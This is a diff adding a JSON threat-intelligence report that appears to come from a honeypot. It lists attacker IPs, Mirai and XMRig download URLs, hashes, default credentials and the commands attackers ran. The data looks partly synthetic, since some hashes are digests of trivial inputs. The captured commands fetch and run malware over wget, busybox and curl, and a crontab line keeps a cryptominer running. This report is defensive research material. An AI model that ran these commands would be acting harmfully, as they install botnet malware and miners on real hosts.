@@ -1,0 +1,1047 @@
+{
+  "generated_at": "2026-08-06T15:56:53.861019+00:00",
+  "counts": {
+    "attacker_ips": 5,
+    "urls": 6,
+    "hashes": 5,
+    "unique_usernames": 12,
+    "unique_passwords": 18,
+    "unique_commands": 22
+  },
+  "attacker_ips": [
+    {
+      "type": "ipv4",
+      "value": "103.149.172.88",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "attack_types": [
+        "iot_botnet_propagation"
+      ],
+      "first_seen": "2026-03-01T11:02:10.050Z",
+      "last_seen": "2026-03-01T11:02:18.000Z",
+      "threat_feed": {
+        "ip": "103.149.172.88",
+        "listed": true,
+        "offline_match": {
+          "reputation": "iot_botnet_scanner",
+          "abuse_score": 95,
+          "categories": [
+            "telnet-bruteforce",
+            "iot-malware",
+            "mirai-variant"
+          ],
+          "country": "ID",
+          "first_seen": "2025-09-20",
+          "feeds": [
+            "AbuseIPDB",
+            "The Honeynet Project"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "The Honeynet Project"
+        ],
+        "risk": "critical"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "185.220.101.45",
+      "sessions": [
+        "a1b2c3d4e5f6",
+        "f6a7b8c9d0e1"
+      ],
+      "attack_types": [
+        "iot_botnet_propagation",
+        "malware_download"
+      ],
+      "first_seen": "2026-03-01T08:12:01.120Z",
+      "last_seen": "2026-03-02T02:11:07.000Z",
+      "threat_feed": {
+        "ip": "185.220.101.45",
+        "listed": true,
+        "offline_match": {
+          "reputation": "known_botnet_c2",
+          "abuse_score": 98,
+          "categories": [
+            "ssh-bruteforce",
+            "mirai-family",
+            "tor-exit"
+          ],
+          "country": "DE",
+          "first_seen": "2025-11-12",
+          "feeds": [
+            "AbuseIPDB",
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ],
+        "risk": "critical"
+      },
+      "session_count": 2
+    },
+    {
+      "type": "ipv4",
+      "value": "198.51.100.77",
+      "sessions": [
+        "d4e5f6a7b8c9"
+      ],
+      "attack_types": [
+        "manual_reconnaissance"
+      ],
+      "first_seen": "2026-03-01T14:18:44.000Z",
+      "last_seen": "2026-03-01T14:20:41.000Z",
+      "threat_feed": {
+        "ip": "198.51.100.77",
+        "listed": false,
+        "offline_match": null,
+        "live_matches": [],
+        "feeds_hit": [],
+        "risk": "unlisted"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "45.33.32.156",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "attack_types": [
+        "cryptominer_deployment"
+      ],
+      "first_seen": "2026-03-01T09:45:22.010Z",
+      "last_seen": "2026-03-01T09:45:35.000Z",
+      "threat_feed": {
+        "ip": "45.33.32.156",
+        "listed": true,
+        "offline_match": {
+          "reputation": "cryptominer_campaign",
+          "abuse_score": 87,
+          "categories": [
+            "ssh-bruteforce",
+            "cryptomining"
+          ],
+          "country": "US",
+          "first_seen": "2026-01-04",
+          "feeds": [
+            "AbuseIPDB",
+            "AlienVault OTX"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "AlienVault OTX"
+        ],
+        "risk": "high"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "91.219.237.12",
+      "sessions": [
+        "e5f6a7b8c9d0"
+      ],
+      "attack_types": [
+        "credential_stuffing"
+      ],
+      "first_seen": "2026-03-01T16:05:01.000Z",
+      "last_seen": "2026-03-01T16:05:04.000Z",
+      "threat_feed": {
+        "ip": "91.219.237.12",
+        "listed": true,
+        "offline_match": {
+          "reputation": "credential_stuffing_bot",
+          "abuse_score": 76,
+          "categories": [
+            "ssh-bruteforce",
+            "credential-stuffing"
+          ],
+          "country": "NL",
+          "first_seen": "2026-02-01",
+          "feeds": [
+            "AbuseIPDB"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB"
+        ],
+        "risk": "high"
+      },
+      "session_count": 1
+    }
+  ],
+  "urls": [
+    {
+      "type": "url",
+      "value": "http://185.220.101.45/bins/mirai.x86",
+      "sessions": [
+        "a1b2c3d4e5f6"
+      ],
+      "threat_feed": {
+        "url": "http://185.220.101.45/bins/mirai.x86",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai",
+          "type": "elf_dropper",
+          "feeds": [
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    {
+      "type": "url",
+      "value": "http://45.33.32.156/xmrig.tar.gz",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "threat_feed": {
+        "url": "http://45.33.32.156/xmrig.tar.gz",
+        "listed": true,
+        "match": {
+          "malware_family": "XMRig",
+          "type": "cryptominer",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      },
+      "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/l.sh",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "url": "http://103.149.172.88/l.sh",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai-loader",
+          "type": "shell_loader",
+          "feeds": [
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1"
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/bot.arm7;",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": null
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/bot.arm7",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "url": "http://103.149.172.88/bot.arm7",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai-variant",
+          "type": "elf_bot",
+          "feeds": [
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"
+    },
+    {
+      "type": "url",
+      "value": "http://malware-cdn.example.invalid/dropper.sh",
+      "sessions": [
+        "f6a7b8c9d0e1"
+      ],
+      "threat_feed": {
+        "url": "http://malware-cdn.example.invalid/dropper.sh",
+        "listed": true,
+        "match": {
+          "malware_family": "Generic-dropper",
+          "type": "shell_dropper",
+          "feeds": [
+            "lab_heuristic"
+          ]
+        },
+        "feeds_hit": [
+          "lab_heuristic"
+        ]
+      },
+      "sha256": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce"
+    }
+  ],
+  "file_hashes": [
+    {
+      "type": "sha256",
+      "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "url": "http://185.220.101.45/bins/mirai.x86",
+      "outfile": "var/lib/cowrie/downloads/a1b2c3d4e5f6-mirai.x86",
+      "sessions": [
+        "a1b2c3d4e5f6"
+      ],
+      "threat_feed": {
+        "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "listed": true,
+        "match": {
+          "family": "Mirai",
+          "type": "elf",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "url": "http://45.33.32.156/xmrig.tar.gz",
+      "outfile": "var/lib/cowrie/downloads/b2c3d4e5f6a7-xmrig.tar.gz",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "threat_feed": {
+        "hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+        "listed": true,
+        "match": {
+          "family": "XMRig",
+          "type": "archive",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1",
+      "url": "http://103.149.172.88/l.sh",
+      "outfile": "var/lib/cowrie/downloads/c3d4e5f6a7b8-l.sh",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "hash": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1",
+        "listed": true,
+        "match": {
+          "family": "Mirai-loader",
+          "type": "shell",
+          "feeds": [
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "The Honeynet Project"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+      "url": "http://103.149.172.88/bot.arm7",
+      "outfile": "var/lib/cowrie/downloads/c3d4e5f6a7b8-bot.arm7",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "hash": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+        "listed": true,
+        "match": {
+          "family": "Mirai-variant",
+          "type": "elf",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
+      "url": "http://malware-cdn.example.invalid/dropper.sh",
+      "outfile": "var/lib/cowrie/downloads/f6a7b8c9d0e1-dropper.sh",
+      "sessions": [
+        "f6a7b8c9d0e1"
+      ],
+      "threat_feed": {
+        "hash": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
+        "listed": true,
+        "match": {
+          "family": "Generic-dropper",
+          "type": "shell",
+          "feeds": [
+            "lab_heuristic"
+          ]
+        },
+        "feeds_hit": [
+          "lab_heuristic"
+        ]
+      }
+    }
+  ],
+  "top_usernames": [
+    [
+      "root",
+      11
+    ],
+    [
+      "admin",
+      2
+    ],
+    [
+      "ubuntu",
+      1
+    ],
+    [
+      "pi",
+      1
+    ],
+    [
+      "support",
+      1
+    ],
+    [
+      "test",
+      1
+    ],
+    [
+      "oracle",
+      1
+    ],
+    [
+      "user",
+      1
+    ],
+    [
+      "ftp",
+      1
+    ],
+    [
+      "guest",
+      1
+    ],
+    [
+      "mysql",
+      1
+    ],
+    [
+      "postgres",
+      1
+    ]
+  ],
+  "top_passwords": [
+    [
+      "changeme",
+      5
+    ],
+    [
+      "admin",
+      2
+    ],
+    [
+      "root",
+      1
+    ],
+    [
+      "123456",
+      1
+    ],
+    [
+      "password",
+      1
+    ],
+    [
+      "ubuntu",
+      1
+    ],
+    [
+      "raspberry",
+      1
+    ],
+    [
+      "toor",
+      1
+    ],
+    [
+      "admin123",
+      1
+    ],
+    [
+      "support",
+      1
+    ],
+    [
+      "pass",
+      1
+    ],
+    [
+      "test",
+      1
+    ],
+    [
+      "oracle",
+      1
+    ],
+    [
+      "user",
+      1
+    ],
+    [
+      "ftp",
+      1
+    ]
+  ],
+  "top_commands": [
+    [
+      "uname -a",
+      1
+    ],
+    [
+      "cat /etc/passwd",
+      1
+    ],
+    [
+      "wget http://185.220.101.45/bins/mirai.x86 -O /tmp/.x",
+      1
+    ],
+    [
+      "chmod +x /tmp/.x",
+      1
+    ],
+    [
+      "/tmp/.x",
+      1
+    ],
+    [
+      "whoami",
+      1
+    ],
+    [
+      "free -m",
+      1
+    ],
+    [
+      "curl -s http://45.33.32.156/xmrig.tar.gz | tar xz -C /tmp",
+      1
+    ],
+    [
+      "/tmp/xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft8XpinWun2sRigMz9dYLcF4S5etEeVy29uWoYbMLhK8A8w8k",
+      1
+    ],
+    [
+      "crontab -l",
+      1
+    ],
+    [
+      "echo '* * * * * /tmp/xmrig -o pool.minexmr.com:443' | crontab -",
+      1
+    ],
+    [
+      "busybox wget http://103.149.172.88/l.sh -O- | sh",
+      1
+    ],
+    [
+      "cd /tmp; wget http://103.149.172.88/bot.arm7; chmod 777 bot.arm7; ./bot.arm7",
+      1
+    ],
+    [
+      "ls -la",
+      1
+    ],
+    [
+      "ps aux",
+      1
+    ],
+    [
+      "history",
+      1
+    ],
+    [
+      "netstat -antp",
+      1
+    ],
+    [
+      "cat /proc/cpuinfo",
+      1
+    ],
+    [
+      "find / -name '*.conf' 2>/dev/null | head",
+      1
+    ],
+    [
+      "exit",
+      1
+    ]
+  ],
+  "ssh_client_banners": [
+    [
+      "SSH-2.0-libssh2_1.10.0",
+      1
+    ],
+    [
+      "SSH-2.0-Paramiko_2.11.0",
+      1
+    ],
+    [
+      "SSH-2.0-OpenSSH_8.9p1",
+      1
+    ]
+  ],
+  "ioc_flat": [
+    {
+      "type": "ipv4",
+      "value": "185.220.101.45",
+      "sessions": [
+        "a1b2c3d4e5f6",
+        "f6a7b8c9d0e1"
+      ],
+      "attack_types": [
+        "iot_botnet_propagation",
+        "malware_download"
+      ],
+      "first_seen": "2026-03-01T08:12:01.120Z",
+      "last_seen": "2026-03-02T02:11:07.000Z",
+      "threat_feed": {
+        "ip": "185.220.101.45",
+        "listed": true,
+        "offline_match": {
+          "reputation": "known_botnet_c2",
+          "abuse_score": 98,
+          "categories": [
+            "ssh-bruteforce",
+            "mirai-family",
+            "tor-exit"
+          ],
+          "country": "DE",
+          "first_seen": "2025-11-12",
+          "feeds": [
+            "AbuseIPDB",
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ],
+        "risk": "critical"
+      },
+      "session_count": 2
+    },
+    {
+      "type": "ipv4",
+      "value": "45.33.32.156",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "attack_types": [
+        "cryptominer_deployment"
+      ],
+      "first_seen": "2026-03-01T09:45:22.010Z",
+      "last_seen": "2026-03-01T09:45:35.000Z",
+      "threat_feed": {
+        "ip": "45.33.32.156",
+        "listed": true,
+        "offline_match": {
+          "reputation": "cryptominer_campaign",
+          "abuse_score": 87,
+          "categories": [
+            "ssh-bruteforce",
+            "cryptomining"
+          ],
+          "country": "US",
+          "first_seen": "2026-01-04",
+          "feeds": [
+            "AbuseIPDB",
+            "AlienVault OTX"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "AlienVault OTX"
+        ],
+        "risk": "high"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "103.149.172.88",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "attack_types": [
+        "iot_botnet_propagation"
+      ],
+      "first_seen": "2026-03-01T11:02:10.050Z",
+      "last_seen": "2026-03-01T11:02:18.000Z",
+      "threat_feed": {
+        "ip": "103.149.172.88",
+        "listed": true,
+        "offline_match": {
+          "reputation": "iot_botnet_scanner",
+          "abuse_score": 95,
+          "categories": [
+            "telnet-bruteforce",
+            "iot-malware",
+            "mirai-variant"
+          ],
+          "country": "ID",
+          "first_seen": "2025-09-20",
+          "feeds": [
+            "AbuseIPDB",
+            "The Honeynet Project"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB",
+          "The Honeynet Project"
+        ],
+        "risk": "critical"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "198.51.100.77",
+      "sessions": [
+        "d4e5f6a7b8c9"
+      ],
+      "attack_types": [
+        "manual_reconnaissance"
+      ],
+      "first_seen": "2026-03-01T14:18:44.000Z",
+      "last_seen": "2026-03-01T14:20:41.000Z",
+      "threat_feed": {
+        "ip": "198.51.100.77",
+        "listed": false,
+        "offline_match": null,
+        "live_matches": [],
+        "feeds_hit": [],
+        "risk": "unlisted"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "ipv4",
+      "value": "91.219.237.12",
+      "sessions": [
+        "e5f6a7b8c9d0"
+      ],
+      "attack_types": [
+        "credential_stuffing"
+      ],
+      "first_seen": "2026-03-01T16:05:01.000Z",
+      "last_seen": "2026-03-01T16:05:04.000Z",
+      "threat_feed": {
+        "ip": "91.219.237.12",
+        "listed": true,
+        "offline_match": {
+          "reputation": "credential_stuffing_bot",
+          "abuse_score": 76,
+          "categories": [
+            "ssh-bruteforce",
+            "credential-stuffing"
+          ],
+          "country": "NL",
+          "first_seen": "2026-02-01",
+          "feeds": [
+            "AbuseIPDB"
+          ]
+        },
+        "live_matches": [],
+        "feeds_hit": [
+          "AbuseIPDB"
+        ],
+        "risk": "high"
+      },
+      "session_count": 1
+    },
+    {
+      "type": "url",
+      "value": "http://185.220.101.45/bins/mirai.x86",
+      "sessions": [
+        "a1b2c3d4e5f6"
+      ],
+      "threat_feed": {
+        "url": "http://185.220.101.45/bins/mirai.x86",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai",
+          "type": "elf_dropper",
+          "feeds": [
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    {
+      "type": "url",
+      "value": "http://45.33.32.156/xmrig.tar.gz",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "threat_feed": {
+        "url": "http://45.33.32.156/xmrig.tar.gz",
+        "listed": true,
+        "match": {
+          "malware_family": "XMRig",
+          "type": "cryptominer",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      },
+      "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/l.sh",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "url": "http://103.149.172.88/l.sh",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai-loader",
+          "type": "shell_loader",
+          "feeds": [
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1"
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/bot.arm7;",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": null
+    },
+    {
+      "type": "url",
+      "value": "http://103.149.172.88/bot.arm7",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "url": "http://103.149.172.88/bot.arm7",
+        "listed": true,
+        "match": {
+          "malware_family": "Mirai-variant",
+          "type": "elf_bot",
+          "feeds": [
+            "AlienVault OTX",
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX",
+          "The Honeynet Project"
+        ]
+      },
+      "sha256": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"
+    },
+    {
+      "type": "url",
+      "value": "http://malware-cdn.example.invalid/dropper.sh",
+      "sessions": [
+        "f6a7b8c9d0e1"
+      ],
+      "threat_feed": {
+        "url": "http://malware-cdn.example.invalid/dropper.sh",
+        "listed": true,
+        "match": {
+          "malware_family": "Generic-dropper",
+          "type": "shell_dropper",
+          "feeds": [
+            "lab_heuristic"
+          ]
+        },
+        "feeds_hit": [
+          "lab_heuristic"
+        ]
+      },
+      "sha256": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce"
+    },
+    {
+      "type": "sha256",
+      "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "url": "http://185.220.101.45/bins/mirai.x86",
+      "outfile": "var/lib/cowrie/downloads/a1b2c3d4e5f6-mirai.x86",
+      "sessions": [
+        "a1b2c3d4e5f6"
+      ],
+      "threat_feed": {
+        "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "listed": true,
+        "match": {
+          "family": "Mirai",
+          "type": "elf",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "url": "http://45.33.32.156/xmrig.tar.gz",
+      "outfile": "var/lib/cowrie/downloads/b2c3d4e5f6a7-xmrig.tar.gz",
+      "sessions": [
+        "b2c3d4e5f6a7"
+      ],
+      "threat_feed": {
+        "hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+        "listed": true,
+        "match": {
+          "family": "XMRig",
+          "type": "archive",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1",
+      "url": "http://103.149.172.88/l.sh",
+      "outfile": "var/lib/cowrie/downloads/c3d4e5f6a7b8-l.sh",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "hash": "2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d2852309f9f9f0c1",
+        "listed": true,
+        "match": {
+          "family": "Mirai-loader",
+          "type": "shell",
+          "feeds": [
+            "The Honeynet Project"
+          ]
+        },
+        "feeds_hit": [
+          "The Honeynet Project"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+      "url": "http://103.149.172.88/bot.arm7",
+      "outfile": "var/lib/cowrie/downloads/c3d4e5f6a7b8-bot.arm7",
+      "sessions": [
+        "c3d4e5f6a7b8"
+      ],
+      "threat_feed": {
+        "hash": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+        "listed": true,
+        "match": {
+          "family": "Mirai-variant",
+          "type": "elf",
+          "feeds": [
+            "AlienVault OTX"
+          ]
+        },
+        "feeds_hit": [
+          "AlienVault OTX"
+        ]
+      }
+    },
+    {
+      "type": "sha256",
+      "value": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
+      "url": "http://malware-cdn.example.invalid/dropper.sh",
+      "outfile": "var/lib/cowrie/downloads/f6a7b8c9d0e1-dropper.sh",
+      "sessions": [
+        "f6a7b8c9d0e1"
+      ],
+      "threat_feed": {
+        "hash": "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
+        "listed": true,
+        "match": {
+          "family": "Generic-dropper",
+          "type": "shell",
+          "feeds": [
+            "lab_heuristic"
+          ]
+        },
+        "feeds_hit": [
+          "lab_heuristic"
+        ]
+      }
+    }
+  ]
+}
